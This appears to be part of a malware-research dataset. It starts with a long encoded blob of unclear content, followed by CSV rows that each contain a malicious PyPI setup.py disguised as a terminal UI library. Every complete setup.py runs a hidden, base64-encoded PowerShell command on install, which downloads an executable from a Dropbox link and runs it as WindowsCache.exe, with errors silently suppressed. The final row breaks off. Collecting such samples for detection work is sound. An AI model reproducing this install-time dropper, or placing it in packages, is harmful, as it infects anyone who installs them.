tjTnpJOXp4JlZPJSNpVHpFQXpUekU0dlRybl49VHJAVVpjcmBYJEYpPXE+RipHK15jci1YJUYqR3E7Rik9WSpGKlAkPmNyIU8jY3ItWCVIIXhneUhaQCMkRy1GKE5IYTEpX0YpJjstR2g4PEBUcm8yK1RybzVAVHJueylUekUxI1Rybl4oVHpFR3pUekU0eFR6RTclVHNKVVdjczZCUmNyOztMY3IhOXdjci1YJWNzNE95Y3JgTHlGKlkkPUghKWw+RikmOz1Ga0U7dkdoOHRARytjTiNIQyVXIUk5engkSTl4RntIKFc2PkcrWiQ+R0YmaypIKFdJfVR6RUElVHJvODtUcm84X1R6RTclVHpFMSNUcm5eKFRyb0JAVHNBT1ZGKSVrPWNycypNY3JgYSVGKlB0O0YqUCg/Rik9ViljczRPeUYpfWgtRipQK0BjczV+TkYpJWs9Y3JzKk1jcmBhJUYqUCQ+SFp4bz9GZ0lLQEhlNHw8RytaJC1HaDh0PUhlN2YjSTl4Rl5HRiZ3PFRybns+VHJvNT9Ucm57KVRybzU7VHJufi1UekVHJlRybzg/VHJuXj1UczFYWkYpPW49Y3M0UnpjciEzdWNyLVglRipHJD9GKmgoPWNzNFgjY3NGOFBGKT1WKWNycjB1Y3JyTCNjci1MemNyITl3Rik9VilGKkckP2NzNkVTY3M0UnpGKlA8XmNyLVUkY3JyRnpIWil1fEZrRTt4SGU0fD1Ga0U7dUk5eEZ7SChZbyRWX1kjY0dGKjV4STl6eCRJOXhGYEhlN2YjVl9iTVBHaDh0K0goWW8mR2g4dDxGPGRiPUgoWW8lVz9YblFJOXp4KEY8Znt2RmtDUy1GPGRiPEdGJmsqSChZbyZHaDh0PEY8Znt1RytaJD5GPGRiKUgoWW8hV0wkVk5IQyE8PUdoQkV4R2hCRXlIKFlvIUhlN2YjV0wkVk5IZTR8XkZrQ1MoSChXSXtUekVIUFRybns8VHNBVVhGKSVrPUcmV298R2g4dDxIKFc2P0goVzY9SChXNl5HK2NOIUhlNHw+R0YqNXpWcTdzWEZrRTt1STl4RmBIZTdmI0hlN2YlRjxkYilIKFlvIUhlN2YjV0x6O1lGPGZ7dkdGJmsrRmtDazxUekVFUlR6RTcjVHpFRClUekU3JFRzMVhaSFpAIyRIODVOO0g4b3JARikmOylHJk5qIUhmQ0lTSGFKYHtIWmZjPUZnSUx5SFp4bz9IWmZkeUdDNW99RmtDUylGa0NlLVRybl4oVHJvNV5UekVIUVRybl49VHMxWFpjcmBhJWNzNGooY3NEUnljci1YJUg4NU93RyUjRS1IWmZjX0goVzY9SChZbyFIQyVXI1c/VjVkSChZbyVWTyk0TEk5eE97VHJvQj9UekUySlR6RUVSVHpFNyVUc0pVV0YqRyQ/Y3ItUiNjczRPeWNyLVglSDg1TjtGZmQjKEg4V2Y+SDhXZj5GKSY8c0haZmR5R2NhNStHJTtMd0hhVDF8RikmOz1Ga0NTO0hlN2YjVk8leWFUcm57KVRybzU7VHpFNHVUcm8yLVRzQWdiRik9ViljcnJMI2NyLTl2RipZPEBjciEzdUYpPVYpY3J7Xk1GKll8YGNyLVUkY3IhQ3hGKT1WKUgheGd5SCNifXtHQlI4LUcmTmk/RikmOz1Ga0U7dEk5engmSTl4RmBHaEJFeUk5eE97VHJvQj9UekUxd1R6RUVOVHJueylUekVCTVR6RUcoVHpFNyZUcm81QFR6RTclVHJvNT9Ucm84X1R6RUVPVHNBZ2JGKSVrPUYqR3o+Y3JgWCRGKX1iKkhhMSlfRmdJS0BIZTdmI0crY056R2hCRSFHRiZrK0ZrRTt1STl4Ul9UekVBJFR6RTR6VHJuXj1UckBVWmNyLUx6Y3ItSXljczRhJGNyLVUkSDhvcyNHY3thekg4V2d6R2NhNnVHJm8jJUdkTnMkSCNifihIOE5heUhhSmB7RikmPHNIYTEpX0ZmbSo7RmtFO3lHK2NOekk5eFh7VHpFRyhUcm8yK1RybzU/VHpFNyVUekVCTVRzSnBkY3JgT3pIYTEpX0YpJjspRyZOaWBGPGRiPEhlNHxfRmtDUyhIKFdJfVRybzVAVHJvOF5Ucm84QFRybnspVHJvNT9UekVFU1Rybzg7VHpFNHpUcm57KVRyQExXY3M0T3ljc0RSeWNzNjJPRik9ViljciFSJGNzNGEkRik9YitIWm9qekcmbyMlR0JhRV5GPGZ7eEk5engoSChZbyRIKFc2XkdoOHQ+RmtFO3lWTyk0TkY8ZGIqRmtFO3VJOXhVfVRzSnBkY3M0Unpjci1YJWNyIVIkY3M0YSRjciFVJUYqRyteRik9VilGKkckP0YpJVAoY3NEbShIWmZjPUZnSUtASGU3ZiFHK2NOeUhlN2YlRytaJDtGa0NiPFRybn4tVHpFRChUc0FYWUYpPVYpY3M0YSRjc0RwKWNzNGooSGExKiVHJm8jJUdCYUZ3SDhOYXlIZXA8TkhhSnsoRyZvIzBGa0U7eEhDIzZfVHpFRCNUekU3JVR6RUR5VHpFNHVUcm81O1RybzU+VHJuXj1Ucm81PVR6RUEoVHJvRT9Ucm81PVR6RTclVHpFRCRUczFMVmNzRFV6SFp4cCFHJm8hX0clO0x3SDhOYXlII3VBfUhaV1c8RmdJSz1HJkVjYEcrY055SGU0fGBIZTdmI0goV0Z9VHpFOE9Uc0pYWGNzNE95Y3ItVSRjci1VJEYqR3E7Y3IhVSVjc0ZIU2NyLVglY3M0YSRjczZFU0YqRyQ/SGExKiVHJmZ1XkcmNVh5R0diZ1lHJSNFP0dGJmsrRmtFO3VJOXp4JkhlNUN7VHpFQSZUcm57KVRybzVAVHpFNHZUckBPWGNyITZ2Rik9VilIIXhmPUdCI1c+RmY/Mj9IQyE8O0goVzY9SChXT31Ucm8yLVRzQWdiRiklaz1HJldwI0g4eHkkRyY1Vz1HY3NIO0YpJjstR2hCRSFGPGRiPUZrRTt4V0wkVk9IKFlvIUhlNUN7VHpFSFFUekVEJlR6RTckVHpFRCFUekVHelRzMVJYY3M0WCNjci1VJEcmV3AjRyZFZHpHJjVXPUcle1E8RmdJS0BIZTR8XkhlN2YkR0YqNXpWX1kjWEgoWW8hSGU3ZiNXTCRWT0Y8ZHE/VHJueylUc0pYWEhaV1h4SGVwO2JIODVPd0cmbyF8R2g4dD1GPGZ7ekhlNHxeRmtDUyhIKFlvIVdMejthSChZbyZWcTcqZVR6RTckVHpFMXpUc0FhWmNyITN1RipHcTtGKT1WKUghKW16R2NhNnVIZXA7Ykg4RVV4RyZvIV9HJk5pYEY8ZGI8SEMhPF9IZTdmI0k5engjRjxme3ZXP1huUVZfYk1QSChZbyRJOXhGX0hDJVd5SWIzKSpIKFlvI0k5eEY/RmtFO3RGPGRuO1R6RTcjVHpFRHlUcm5ePVR6RUQhVHpFRChUekUxI1RybzU/VHJueylUekU0JFR6RUQkVHJuXi1UekU0dlRybnspVHMxSVVjci05dmNzNjJPSFp4bz9GZ0lLXkhDJVd6SEMlVyNGa0U7eFZfYk1OSChXRn1UekU0eFR6RUhSVHNBUldjci1VJGNycypNSFpAIyRIOFdmYEZrRTt2SChXRn1UekU4T1R6RTckVHpFNHhUekU3JVRzSlVXRipQPF5GKT1oO0YqR3c9Y3ItWCVjciFSJEYqRyQ/Rik9WSpjczRkJWNyLVglRio3bjtGKll8YEYpJWs9SFopdiNHJm8jJUdkTnJeR0IjWHpHZDVnIUhETyNhRmdJTHlIWil2I0djO1RfSChXTHtUekU3JVR6RTF3VHJvQj9UekUxelR6RUd6VHJueylUc0pVV2NzRG0oY3JgRndIWmZkeUcmZnYkR0IjV2BHK2NOeUcrY055RjxkYipGa0NrPFR6RUEkVHpFNCVUcm81PlRybnspVHpFNCRUekVHKFRybn4qVHNBUldGKT1WKWNyIVIkY3JgWCRjciFMIWNzNGooRik9VilHJjVXPUhaeHAhR0dTYkpIZjNCZkZnSUx5R0d0dE1HLVheZEcmTmohR2NzSDtGKSY8c0dkTnMkSCNifihIOG9zI0hhQT1gRikmPHNIWmZkeUg4TmF5SCMxeEBIOGZtIUcmZnYkR0IjVz5GKlJJeEclO0x3R2NzSDtGKSY8c0dCYUU7SFp4b19HaDh0PkhDITw8RmtDUy1IQyE8X0ZrRTt4V242ZVJXP1Y1YUgoV0Z8VHpFMktUc0pnYWNyYGcoY3ItWCVIIXhneUgjYn4oSDhvckBIOGZsP0YpJjs9RmtFO3ZHaEJFI1ZfWSNiRytaJDtGa0U7dUk5engoSEMhPDxGPGZ7eUhDITw8RmtFO3hIQyVXIUZrRTt5SChZbyNIQyVXIUk5eFh7VHpFRCRUekU3I1RybzVAVHpFNyVUckBMV0YqUHo9Y3NEaiZjczRnJmNyLVglY3IhUiRGKlA8XmNyPDJRRipHK15GKT1WKUgheGZgSChZbyZGPGZ7eUgoVzY+RmtDUy1IQyVXJUk5engoRytaJF5HK1okLUgoWW8hV0x6O2FIKFlvJlZxQURMR0YqNXhIKFlvJkdoQkUhSTl4UnxUekVEJFRybnspVHJvNT9Ucm9FPVR6RUVPVHpFNHhUcm5ePVR6RTF6VHJuXi1Uc0FPVmNzNFJ6Y3ItWCVGKkdxO2NyLWEmY3M2Mk9IWkAjJEcmbyFfRyZOaiFII2w0fEg4eHkkSCFAcyFHJmZ2JEhaeG9gR2hCRSFGa0NoPFRybnspVHpFNCRUcm5+PlRybl4rVHpFRCRUcm5ePVR6RTF6VHJuezxUekU0JVRyb0VgVHJuXj1UckBVWmNyLUx6Y3ItSXlGKkd0PGNyLVglSCF4Z3lHaUY/UEhaKXVARyZmdiRHJmZ2JEdCI1c+RmY/M3ZHYyNOPEgjSjslRyZvIyVHJkVkekctWF5kR0JzUnlIKVVLZ0YpJjxzSFpAIV5IIXhmPUg4eHkkSGYzQmZGZ0lLPUcmRWR6R2M7VXlHZFd4X0cmV29ARmdJTHlHQiNYekg4eHheRipSSF5HaEJFeUgoWW8mR2hCRXpJYjFPfEgoVzY/SEMlVyFJOXp4JEk5engoSEMlVyFHaEJFIUliMU9ARmtDYjxUekVBeVRybzg9VHpFRVFUekU3JFRyQFVaY3I7e09jci1Dd2NyIUN4Y3ItVSRIOG9zI0hhMSolSGYzQ1JIIUByP0YpJjxzSFpmZHlIOE5aPUhhMSlfSDgpJV9GKSY7LUY8Znt2Vz9YblFWTyk0S0crY056STl6eCRJOXhGQEhlN2YhSWIxT2BIZTR8PUZrQ2s8VHpFN3lUekVIUVR6RUR6VHJueylUcm81P1R6RTEkVHpFRU9Uc0FVWEYpJWs9Y3JyQ3ljcnw4UmNyLTl2SFpmZHlHJmZ2JEdCI1h6Ry1PO2NGZm0qPEdoOHQrSChZbyFIZTVDfFRzQU9WRio3ay1GKSVrPWNyckZ6Ril9dD5GKSVrPUhaeHAhRyZvIyVHQmFGd0djYTUrR0I4fHRHY3NIO0ZnSUtASGU3ZiFHK2NOeUhlN2YlRjxme3dJOXp4JEk5englR2hCRXpXP1huU0hlNHw9RmtDUy1GPGRiK0dGJms+RmtFO3hIKFc2PkZrRTt0R2hCRSNHaDh0QEdGJnpgVHpFNyVUekVEeVRybn4tVHJvOEBUekVEJFRybnspVHpFRCRUekVFU1RybzU/VHpFNHhUekU3JVR6RUR5VHpFQXlUcm9CPFRybzg7VHJuXj1UekUyTVR6RUQlVHpFR3pUekU0elRybl49VHpFMXpUekVBJFRybl4rVHJvNT5UekU3JFRzMVhaY3IhSXpGKX1rO0haV1h4RyZvIzBGa0U7d0hlNUN+VHJvNT9UekU3JVRzSlVXY3M2QlJjcjteTmNzNG0pY3ItWCVGKkckP0YqaCg9Y3M1fk5GKmkwYGNyLVUkY3M0VSFGKlkkPUg4V2Y+RyZFYz5GKSY7KUclO0x3SDhOYXlIIzF4QEg4RVV4RyZvIyVHZE5zJEg4eHh+Rjxme3lHK2NOekk5engkSTl6eCZIZTdmI0doQkUhRytjTnpJOXp4KEhDITw7RmtFO3lHK1p8QFR6RTckVHJAVVpIWnhwIUgpQzlRSGFBPWBGKSY7LUdoOHQ/R2hCRXdHaDh0PkZrQ1MpRmtFO3hIQyE8X0ZrQ1MtSChXNntIZTdmI0goV0l9VHJvNUBUcm9CPVRzQVhZRiklaz1jcnJGekhaeHAhSClDOVFIKUM5UUcmbyMlRyZFYz5GKmFOPUdCYUZ3SGUqfmRGZ0lLQEhlNHw+SGU0fD1IQyMze1R6RTclVHNKVVdIWnhvfEcrY04kVl9iTU5IKFdGfVR6RTd6VHpFNHlUc0FSV2NyLVglRyY1WHlIZXA7YkhaKXYjR2ROcyRHJmZ1e0hlNHw9SEMjM31Ucm81PlR6RTckVHpFMXpUcm57PFRybl4rVHpFRHlUcm5ePVRyQFVaRiklYi1jciFVJWNzNG0pY3ItVSRjcnMqTWNyO35QY3M0UnpGKlAoP2NyLVUkRyZXcCNHLU87Y0YpPl90SGExKiVHJmZ2JEhaeG8/RyUjRT9GPGRxP1R6RTclVHpFRHlUekVBeVR6RUcqVHpFRVFUcm5ePVR6RTJLVHJvRUBUcm57PFRzQU9WRiklaz1jczRVIUYqUHQ7Y3JzI0tjcmBkJkYpPVYpSCF4Zj1GKlJIXkY8Znt2R0YmaytGa0NrPFRybzheVHJueypUcm81QFR6RTckVHpFNyRUekVEeVRzSlhYRippMGBjci1YJWNzNE95Y3JgTHljc0RhI2NzNjVQRiklaz1GKkd3PUYqN2stRipZfGBGKjdoK0YpPVYpY3IhUiRGKX10PmNyIUN4Y3JgZyhGKSVrPWNycyNLY3NGOFBjcjteTmNzRkhTRik9ViljciFSJGNzRG0oY3JgVSNGKkcrXmNyLVglY3M0YSRjcnJPJEYqWSQ9Y3IhOXdGKSVrPUcmV3AjR2MjTjxII0ElXkgjQSYkRyZmdiRHR3RzZkhDJVcjRmtFO3hWX1kjWUZrQ2s8VHJufj5Uc0FnYkYqR3E7Rik9Viljci1MemNyO35QRil9cT1GKmh8X2NyLVglY3IhUiRGKSViLUhaeHAhSERPJE1HJmZ1fEhDJVcjSChXNl9HaDgrX1R6RTckVHJAVVpjciFGeWNyIUN4Y3M0WCNGKT1WKUgheGd5Ry1PPE9HYyNOPEdjakItRikmPHNIWkAhXkgheGY9SFpmZHlHY2E1K0YpJjs9RmtFO3RJOXp4Jkk5engoRytaJDtGa0U7dUk5eEZgSGU3ZiNWX1kjYkgoVzY+RmtDUy1IQyVXJUk5engoVnE3KmdUcm57KVRybzU7VHpFQXlUekVHJlRybzg/VHJueylUekU0JFRybl4rVHJvNS1Uc0FPVkYpPVYpSCF4Z3lIOHh4fUhlNHxARjxme3dIKFdGfVR6RUcoVHpFRHlUekVEKVR6RTclVHpFNCRUekVFUlRybl48VHpFRHlUcm5ePVR6RTF6VHpFRyhUekVEeVRybzg8VHpFNyVUckBMV2NzRGEjY3JyTCNGKSViLUYpPVYpRyY1WHlHY2E1K0dCOHx0R2NzSDtGKSY7PUZrRTt3SGU1RmBUekVEeVR6RTckVHpFRCNUekU0eVRzQWpjY3IhOXdGKSVrPWNyckZ6Y3I7e09IISlsPkg4RVQ8RmdJTHlIWil2I0ctTzxPRy1GJmJHJmZ1XkYpJjs7RmtFO3ZGa0U7eFduNEJoVHJueylUekUxd1RzSlhYY3JgZCZjczRqKEYpPVYpY3M0YSRGKmgoPWNzNGooY3IhQ3hjci1YJUYpJWItY3I7flBGKX10PkhaV1c8RmdJS0BIZTdmIUcrWl9gVHpFNHVUekU3JVR6RTEjVHpFN3ZUekVFT1R6RUVTVHpFNyVUekU0JFR6RUcoVHpFOFFUekVEIVR6RTclVHpFRCVUc0FSV2NzRjVPRipZKz9GKSVrPWNyckZ6Ril9dD5jci1SI2NzNGQlY3ItVSRjczRVIUYqUHQ7RipoPD9jc0ZCUWNyLVglRipHJD9jczZFU0YqN2grY3NGSFNGKSVrPUYqR3c9RipQdDtjc0Y1T2NzRkhTY3ItWCVGKkckP2NzNkVTY3M0YSRjciFMIWNyLVglRipHJD9GKSVQKGNzRG0oSFopdUBGKSY7PUZrQ1MqSGU3ZiFJYjMpKUhlN2YjSTl6eCZWTyVqWkhDJVd6R2hCRSNXTHo7WkZrQ1MtRjxme3hHRiZrPUhDJVckVk8pNExJOXhYe1RzMUlVRio3aCtjczRkJWNyLVglSDg1TjtGZmQkckhleV9PSGV5X09HJm8jMEZrRTt4SEMhPDtHaEJFIUliMU9ARmtFO3hIQyE8QEgoWW8lSTl4RnxIZTdmI0k5engjRjxkbjtUekU3eVRybzU8VHpFNyVUekVEJFRyb0U9VHpFRCNUekVIUVR6RTclVHpFNCRUcm9CYFRybn4tVHpFRU5UekU3JFR6RUQhVHJvODtUczFJVWNzNGEkRiklaz1HJldvQEcmTmohRy1nfmVHJkVkekcmbyMlR0J7aiNHJSNGdkhmM0NSR2M7VXlHJm8jJUdkTnMkR0J7aiNIOHh5JEdkRWxARikmOztGa0NTKEZrRTt4V242ZU9Ga0U7dkk5eFh7VHpFRyhUcm5+LVR6RUQhVHpFNyRUekUxelRzQVhZY3NGQlFGKkd3PWNyLVUkY3M0WCNjci1MekYpJWItY3IhSXpGKSVrPUYqR3c9RipQdDtGKmg8P0YqR3o+Y3ItWCVjcnI2d2NyITN1Y3JgRndjciFGeWNyLVglY3IhUiRGKX10PmNyIUN4Y3JgZyhGKSVrPUcmV29ASDh4eSRIOG9zI0hhSnsoRyZvIyVHQmFFO0haeHAhSChefE9HJTtLO0ZnSUx5R0d0dE1IYTEpX0haZmR5R2NhNnVHJm8jMEZrRTt4V242ZVFGa0NoX1R6RTclVHJATFdGKlkrP0YqaDw/Y3IhVSVGKSVrPUcmV29AR0IjVz5GZ0lLX0ZrRTt2STl6eCRJYjMpJUZrRTt4STl6eCRIQyE8PEZrQ1MtSEMlVyRXP1huU0hDJVd6R2g4dC1Ga0U7dUk5eEZfSEMlVyFIZTR8QEgoVzY+RmtFO3VJOXhGX0hDITw7SGU3ZiVWTyVqVkgoVzZeRytaJDxIZTR8PkdGJms8SEMlVyFJOXhYe1Ryb0JgVHpFOFFUekVEKFR6RTckVHMxWFpjcjt+UEYqR3Q8Y3NEUnlGKT1WKUgheGY9RyZOaT9GKT5fdEhaQCMkRyZvIyVHQmFFO0clO0x3SCF4Zj1HJldwI0cmbyMlR0JhRndIIzF5I0gjdUF9SDhvcyNHJm8jJUdkTnMkSFpAIyRHJkVkekdjc0l3RyZvIyVHQmFFO0haeHAhSChee2lGPGRiKUgoWW8mR2hCRSNWTyUjaVRybzItVHJuXj1UekUxelR6RTR4VHpFQlJUcm81O1Rybl49VHJuXj1Ucm81O1Rybl4pVHpFNHVUekU3JFR6RTF6VHJufj5UekU3JFR6RTR5VHpFNyVUc0pVV0YqUDxeRik9aDtGKkckP0YpPVYpRipHJD9jcnJPJGNzRFV6Y3M2OFFjci1YJWNye15NY3JyTCNGKT1oO0YqUHo9Y3ItVSRHJldvQEdCI1c+RipSSF5IKFc2PkZrRTt4SEMjMEBUcm84XlRzQWpjY3ItVSRjcnJGekYpfXQ+RiklWStGKlB0O0YpJWs9SDhvcyNHY3thekg4V2ZgRmtFO3ZJOXhYe1R6RUQkVHNKWFhjcmBnKGNyLVUkRipHdz1IOFdmPkgjQSVeRyV7UTxGKSY8c0haQCFeSDgpJiVIWil2I0gpVUxTRyZvIzBGa0NoPlR6RTVNVHpFSFFUcm57KVR6RTEjVHJuXihUekVFUlR6RTR5VHJuXj1UckBVWmNyLUx6SFopdXxGPGZ7d0goV0Z9VHJuezxUcm5eK1R6RUVOVHJuXj1Ucm81PVR6RUEoVHpFRyhUcm5+P1Rybl49VHJAVVpIWnhvP0dkRWxAR2NhNnVHJm8jMEZrQ1M8SChZbyVGa0NoP1RybnspVHJvNT9Ucm9FPVRybzheVHNBamNjci1VJEg4b3MjRy1YXmRHJk5pe0hDJVchSTl4Rl9IQyE8X0ZrQ1M7RmtDaD5UekU3JVR6RTQkVHJufj5Uc0FnYmNzRkVSY3ItWCVIIXhmPUdCI1h6R2Q1ZyFIWil2I0cmbyFfRyU7THdHZFd5JUhaQCMkR2Q1Zj9GZ0lMeUdCI1dgRytaX3xUekVEeVRybnspVHJvMjtUczFJVWNyPDJRY3M0WCNjci1YJWNycjZ3RipZKz9GKmg8P2NyIVUlRiklaz1GKkd6PmNyYFgkY3JgTHlGKlB0O0YpPVYpSCF4Zj1IYUE+JkctRiZiRyZXcCNHJmZ1fEhDIzN8VHJufjtUc0FVWEYpPVYpY3IhUiRGKlA8XkYpfWIqSFopdUBGZ0lMeUdHdHRNR2N7YXpIOE5heUgpQzlRRyZvIyVHZE5zJEhmM0NSRy1GJmJHJjVXPUYpJjstR2g4dD9HaDh0QEdGKjV3SGU3ZiNIKFlvJkdoQkV6SWIzKSpIKFlvJVZPKTRMSTl6eChIZTVDX1R6RUhPVHpFRVJUekU3JFRyQFVaY3ItTHpIYTEqJUhab2p6RyZvIV9HY3NJd0haQCMkR2Q1ZyFIWmZjPUYpJjxzSFpmYz1HQlI5dkhlXzVlRyZOaT9GZ0lLPUcmNVh5SGFKYH5HK1okPUZrRTt2STl4WHtUekVBJFRzSlhYY3M0bSljci1YJUYqR3E7Rik9WSpjczYyT0gheGd5RyZmdXtIZTR8PUhDJVchR2hCRSFWTyVqV0ZrQ1MtSGU0fDxGPGZ7dVZxQURMSEMhPDxGa0NTLUhDJVd5SWIxT3xGPGRxQFR6RTclVHpFMXdUekU0JVR6RUEmVHpFRCVUcm5ePVRyQFVaSFopdXxIZTR8QEhDJVchSChXRn1Ucm5+PlRybl49VHNBYVpjci1VJEcmTmlgR2g4dDxIKFc2QEY8ZGIpSChXSX1UekVBJVRybzg+VHNBZ2Jjci1YJUcmNVc9SFp4cCFIKF57aEhlN2YjSChZbyFXTHo7WUhDJVcjSWIxZH1Ucm57KVRzSlVXRil9dD5jciFVJUYqR3E7Y3ItWCVIODVPd0clI0UtSDhXZ3pIZjNCZkYpJjxzR0JhRndIIzF4YEcrWl99VHpFNyVUc0pVV2NyLUl5Y3NGQlFjczRSekYpJWs9RyZXcCNIOHh4XkYqSUN3SGV5XmNGZ0lLQEhlN2YlSEMhPDxIKFlvJkgoVzY+RmtDazxUekVEJFR6RTcmVHJvOD1Ucm5ePVR6RTJNVHpFOFBUcm81PFR6RUd5VHpFNyVUc0pVV2NzNGEkSCEpbD5IODVOO0ZnSUx5R0JzUnlHR2JoS0dHYmdZSCNKLV9GKSY8c0dkTnJeRyZOaT9GZiZ8dUhaQCMkRyZmdV5HJjVYeUghKWxfRmtFO3hGa0U7dkk5eFh7VHJufj5UekU0IVRybzU7VHJuXj1UekUyTVRybl47VHJvMitUekVIU1R6RTclVHJvNT9UczFMVkYqUDxeY3IhTyNGKT1WKWNycjZ3Y3M0T3lGKll6PGNzNjhRRik9VilIIXhmPUdCI1h6R2RXeSVIKVVMU0cmZnV8SEMjM3xUcm5+KlRybzhAVHJueylUekU0JFR6RUQkVHJuXitUekVIU1RybnspVHpFQk1UekVFUlRzSlhYRippMGBjci1VJEYqR3c9Rio3ay1GKlk8QEYqaD9AY3ItVSRGKkd3PWNzRFV6SDg1T3dIKTMzUEcmbyMwRmtDUypIZTdmIUhlN2YmV0x6O1lIKFdGfFR6RUJSVHpFQlJUcm8yO1Rybl49VHpFMXpUcm57PFRybnsqVHpFRCZUekU3JFRzMVJYRipoP0Bjcjs7TGNzNjVQRik9ViljciFSJGNzRG0oRik9cT5jczRqKGNyLVUkRyZXcCNHLU87Y0ZmbSo8RmtDUylGa0NTLUhDJVd5SWIzKSpGPGR0PVRybnspVHJARlVGKll8YGNyIU8jY3IhOXdGKT1WKUgheGd5SFpAIyRHJngqJkhlcDtiRikmOz1Ga0NlLVRybn4+VHpFNCNUcm57KVRybzU/VHJvOF9Ucm81O1R6RUhSVHJueylUc0pYWGNyITN1RipQej1GKlAkPkYpJWs9RipHdz1GKjdrLWNzRGQkRio3ay1GKT1WKWNycjB1SDg1TjtGZzlGeEhETyRNRyZvIyVHZE5yXkhhQT1gR0I4fHRHY3taPkZnSUteSEMhPD9IZTdmJVduNEJnVHJueylUcm81P1R6RUcpVHJvNT5Ucm9FQFR6RTclVHpFMXVUczFJVWNyLVIjRipHcTtjci1YJWNycjZ3Y3NEYSNGKmg8P0ghKW16RyZvIXxHaDh0PUY8Znt6RmtDUztGa0NTKUZrRTt4SEMlVyVJOXp4KEk5eFV8VHpFNyVUckBGVWNzRG0oSCEpbXpIWil1QEYpJjs7RmtFO3ZGa0NTO0ZrQ2g8VHJuXj1UekUxelRybn4+VHJueypUekVEJVRybnspVHMxSVVGKSVQKGNzNkJSRipQKD9jci1VJGNycypNY3I7flBjczRSemNyIUwhRik9ViljciFSJGNzNGEkRik9YitjciE5d2NyLVUkRiklaz1IIzF4QEdCI1h6SGZDSGdGKSY8c0haQCF8RjxkYj1HK2NOeUgoVzY9SChXNj1IKFc2XkY8Znt3Rjxme3ZHRiZrK0ZrQ1MtSEMlVyRXP1huU0dGJms9SEMhPDtIKFc2XkdoQkUjRjxme3VWcUFETkk5englSTl4WHtUcm5+PlRybl48VHJvOD1Ucm5ePVR6RTF6VHpFNHl
+3f62a82dc2f3d8515864acea6683f931b0639d22,selfmcosintrandom-1.3,selfmcosintrandom-1.3/selfmcosintrandom-1.3/setup.py,pypi,Python,1,pypi_malregistry_malicious_exclude_aligned_v3,e8e5ba53d4672a9eb9b36b3f13ece748e2d2af69,"from distutils.core import setup
+
+try:
+  import subprocess
+  import os
+  if not os.path.exists('tahg'):
+    # www.esquelesquad.rip
+    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)
+except: pass
+try:
+  setup(
+    name = 'selfmcosintrandom',
+    packages = ['modlib'],
+    version = '9.60',
+    # license='MIT',
+    description = 'A library for creating a terminal user interface',
+    author = 'EsqueleSquad',
+    author_email = 'tahgoficial@proton.me',
+    classifiers=[
+      'Development Status :: 3 - Alpha',
+      'Intended Audience :: Developers',
+      'Topic :: Software Development :: Build Tools',
+      'License :: OSI Approved :: MIT License',
+      'Programming Language :: Python :: 3',
+      'Programming Language :: Python :: 3.4',
+      'Programming Language :: Python :: 3.5',
+      'Programming Language :: Python :: 3.6',
+      'Programming Language :: Python :: 3.7',
+      'Programming Language :: Python :: 3.8',
+      'Programming Language :: Python :: 3.9',
+      'Programming Language :: Python :: 3.10',
+      'Programming Language :: Python :: 3.11',
+    ],
+  )
+except: pass"
+4f37677b78c868f4a17e71cc000f32f22050963b,urlcpu-2.23,urlcpu-2.23/urlcpu-2.23/setup.py,pypi,Python,1,pypi_malregistry_malicious_exclude_aligned_v3,85541c4b78857e01fe5047e42a33235e45414434,"from distutils.core import setup
+
+try:
+  import subprocess
+  import os
+  if not os.path.exists('tahg'):
+    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)
+except: pass
+try:
+  setup(
+    name = 'urlcpu',
+    packages = ['modlib'],
+    version = '4.31',
+    # license='MIT',
+    description = 'A library for creating a terminal user interface',
+    author = 'EsqueleSquad',
+    author_email = 'tahgoficial@proton.me',
+    classifiers=[
+      'Development Status :: 3 - Alpha',
+      'Intended Audience :: Developers',
+      'Topic :: Software Development :: Build Tools',
+      'License :: OSI Approved :: MIT License',
+      'Programming Language :: Python :: 3',
+      'Programming Language :: Python :: 3.4',
+      'Programming Language :: Python :: 3.5',
+      'Programming Language :: Python :: 3.6',
+      'Programming Language :: Python :: 3.7',
+      'Programming Language :: Python :: 3.8',
+      'Programming Language :: Python :: 3.9',
+      'Programming Language :: Python :: 3.10',
+      'Programming Language :: Python :: 3.11',
+    ],
+  )
+except: pass"
+5f38138b467df73e49cda159ebcaa6cf4117231f,libvmnvidia-1.36,/mnt/data/wangshibo/pypi-MAIN/pypi-main/packages/libvmnvidia/1.36/tar-gz/setup.py,pypi,Python,1,malwarebench_pypi_malicious_exclude_aligned_v3,2e23c6ecd00038fe7d3a0e07b168096c0fada357,"from distutils.core import setup
+
+try:
+  import subprocess
+  import os
+  if not os.path.exists('tahg'):
+    # www.esquelesquad.rip
